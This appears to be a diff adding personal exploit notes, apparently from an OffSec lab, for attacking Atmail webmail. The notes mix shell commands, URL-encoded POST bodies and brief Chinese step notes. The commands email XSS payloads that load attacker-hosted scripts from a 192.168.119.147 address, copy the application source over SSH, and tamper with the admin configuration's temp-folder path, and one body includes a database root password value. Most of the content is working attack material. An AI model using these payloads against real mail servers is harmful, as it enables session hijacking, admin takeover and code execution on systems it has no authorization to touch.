@@ -1,0 +1,26 @@
+./atmail_sendemail.py atmail '<script src="http://192.168.119.147/atmail-session.js"></script>'
+./atmail_sendemail.py atmail '<script src="http://192.168.119.147/exploit.js"></script>'
+
+
+ssh atmail@atmail  -oKexAlgorithms=+diffie-hellman-group1-sha1
+scp  -r -oKexAlgorithms=+diffie-hellman-group1-sha1 atmail@atmail:/usr/local/atmail ./
+
+1.發現可以在郵件內操作XSS
+2.透過XSS可以讓admin登入回彈本地執行js
+3.查看source code可以發現attachfile的方法及上傳後的路徑
+4.查看source code可以發現路徑變量可以強制修改
+
+
+
+$filenameFSABS = APP_ROOT . users::getTmpFolder() . $filenameFS;
+APP_ROOT = /usr/local/atmail/webmail
+users::getTmpFolder() = tmp
+
+
+save=1&fields%5Badmin_email%5D=admin%40offsec.local&fields%5Bsession_timeout%5D=120&fields%5Bsql_host%5D=127.0.0.1&fields%5Bsql_user%5D=root&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9&fields%5Bsql_table%5D=atmail6&fields%5tmpFolderBaseName%5=
+save=1&fields[sql_user]=root&fields[sql_pass]=956ec84a45e0675851367c7e480ec0e9&fields[sql_table]=atmail6&fields[tmpFolderBaseName]=
+save=1&fields%5Badmin_email%5D=admin%40offsec.local&fields%5Bsession_timeout%5D=120&fields%5Bsql_host%5D=127.0.0.1&fields%5Bsql_user%5D=root&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9&fields%5Bsql_table%5D=atmail6&fields%5BtmpFolderBaseName%5D=
+
+
+save=1&fields%5Badmin_email%5D=admin%40offsec.local&fields%5Bsession_timeout%5D=120&fields%5Bsql_host%5D=127.0.0.1&fields%5Bsql_user%5D=root&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9&fields%5Bsql_table%5D=atmail6&
+save=1&fields[sql_user]=root&fields[sql_pass]=956ec84a45e0675851367c7e480ec0e9&fields[sql_table]=atmail6&fields[tmpFolderBaseName]=
